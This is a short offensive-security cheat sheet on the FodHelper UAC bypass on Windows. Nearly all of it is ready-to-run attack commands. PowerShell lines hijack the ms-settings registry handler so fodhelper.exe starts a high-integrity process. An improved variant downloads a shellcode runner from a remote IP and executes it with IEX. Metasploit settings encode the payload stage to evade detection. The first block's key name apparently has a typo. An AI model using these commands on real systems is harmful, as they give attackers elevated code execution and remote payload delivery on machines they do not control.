# UAC

## Bypass: FodHelper

Fodhelper.exe is an application that manages optional features like region-specific keyboard settings. It also runs as _high integrity_ due to the way it interacts with the Windows Registry, more specifically the current user's registry, which we can modify.

```powershell
New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value powershell.exe â€“Force
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

This is also integrated in Metasploit `(exploit/windows/local/bypassuac_fodhelper)`.

We can improve Fodhelper like so, where `run.txt` is a shellcode runner:

```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.183.133/run.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

Then in msfconsole:

```
set EnableStageEncoding true 
set StageEncoder x64/zutto_dekiru
exploit
```
